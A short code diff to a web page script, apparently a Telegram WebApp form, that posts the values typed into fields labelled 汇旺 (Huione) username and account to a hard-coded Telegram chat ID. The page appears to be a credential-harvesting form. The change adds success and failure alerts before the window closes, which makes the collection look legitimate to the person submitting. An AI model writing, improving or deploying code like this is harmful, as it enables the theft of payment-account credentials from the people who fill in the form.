@@ -36,7 +36,15 @@
                 "chat_id": "5458197333",
                 "text": "汇旺用户名: " + document.getElementById('username').value + "\n" + "汇旺账号: " + document.getElementById('account').value
             });
-            Telegram.WebApp.close();
+            xhr.onload = function() {
+                if (xhr.status != 200) { // HTTP error?
+                    // handle error
+                    alert('提交失败！请稍后再试');
+                } else { // show the result
+                    alert('提交成功');
+                    Telegram.WebApp.close();
+                }
+            };
         }
     </script>
 </body>
